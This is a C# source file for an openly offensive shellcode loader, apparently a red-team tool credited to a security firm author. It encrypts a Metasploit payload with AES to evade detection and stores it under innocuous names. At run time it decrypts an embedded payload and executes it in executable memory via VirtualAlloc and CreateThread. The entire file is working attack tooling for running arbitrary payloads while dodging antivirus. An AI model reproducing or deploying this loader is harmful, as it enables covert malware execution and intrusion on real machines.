using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;


/*-----------------------------------------------
 * Simple-Loader.exe: Simple Shellcode Loader   |
 *                                              |
 * Author: @jfaust0                             |
 * Contact: joshua.faust@sevrosecurity.com      |
 * Website: SevroSecurity.com                   |
 * ---------------------------------------------*/


namespace goodTimes
{
    class Program
    {
        // CHANGE THESE VALUES --> Seriosuly, these should not be hard coded!
        public static byte[] key = new byte[] { 0x33, 0xED, 0x8A, 0x15, 0xD9, 0x26, 0xC5, 0x1C, 0x95, 0xF1, 0x4C, 0x11, 0xE4, 0x37, 0xD4, 0x5B, 0xE8, 0xDD, 0x8E, 0xED, 0xDC, 0x01, 0x38, 0xC7 };
        public static byte[] iv = new byte[] { 0x2B, 0x6F, 0xD1, 0xE3, 0x59, 0x6F, 0xC3, 0x31, 0x62, 0xC9, 0x98, 0x55, 0x7B, 0x00, 0xCB, 0xD1 };

        // MAIN
        static void Main(string[] args)
        {
            String app_name = AppDomain.CurrentDomain.FriendlyName;
            String usage = $"Usage: {app_name} <path_to_metasploit_payload>";

            // ENCRYPT PAYLOAD
            if (args.Length == 1)
            {
                if (!File.Exists($@"{args[0]}"))
                {
                    Console.WriteLine("[!] File Does Not Exist!");
                    Environment.Exit(1);
                }

                Console.WriteLine("[i] Encrypting Data");

                // Read in MetaSploit Byte[] Code from File
                String fileData = System.IO.File.ReadAllText($@"{args[0]}");
                String tmp = (fileData.Split('{')[1]).Split('}')[0];

                // Translate to Byte Array
                string[] s = tmp.Split(',');
                byte[] data = new byte[s.Length];
                for (int i = 0; i < data.Length; i++)
                    data[i] = byte.Parse(s[i].Replace("0x", ""), System.Globalization.NumberStyles.HexNumber);

                // Encrypt and Encode the data:
                byte[] e_data = Encrypt(data, key, iv);
                String finalPayload = Convert.ToBase64String(e_data);
                Console.WriteLine($"[i] Replace the hiphop variable with your new payload:\n\n\t String hiphop = " + '"' + $"{finalPayload}" + '"' + ';');

                Environment.Exit(0);
            }
            // THROW EXCEPTION IF MORE THAN 1 ARG
            else if (args.Length > 1)
            {
                Console.WriteLine(usage);
                Environment.Exit(1);
            }
            // RUN PAYLOAD 
            else
            {
                // msfvenom -p windows/exe cmd=calc.exe -f csharp --> CHANGE ME!
                String hiphop = "ZxOy1BksVfrlq8wcmyHY8GwwiBZd8NGrGQiKvx15hcv9sQ9apoO6NGbNBxAeS4NLHSz4owcdPgQTTejYJr80Ke4ynoy41yrc5RD0uqt1ppyxDAeYGATQy7xFbN247gwFee5cPZAFyBzbI6DvOLBFSJiP64kv5T7pX3iapVsX7ORmg7Ubfa1M9PcYNm5qzS9dyHxFdeD578YA6DGYC0UPzmeDXB11R0MWmPAkRGFftQp + YdurMHce1R4HC9bQ0gtm / MLHIP / UTPbIUtwrEAqQ / SYJcJCmeCPynYLNYrn9ae1xvCBokUTgdK + gpUa58ss2F4F60p1ujZNHmQ1Bn39WZmK5R4wSVmdFJpKRZXeGycAziEVlGjsS7XDKsvQvWvaZKqealuTWxH9q6n++zrRJZ0TBorjcFHKJZOLK5bNgKx0DbmFHXz + KBH400o";

                byte[] de_data = Decrypt(Convert.FromBase64String(hiphop), key, iv);
                nonsense(de_data);
            }

        }

        // Shell Code Loader
        public static bool nonsense(byte[] shellcode)
        {

            try
            {
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);

                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("exception: " + e.Message);
                return false;
            }
        }

        // Used to Load Shellcode into Memory:
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
        );


        public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, encryptor);
                }
            }
        }

        public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

    }
}
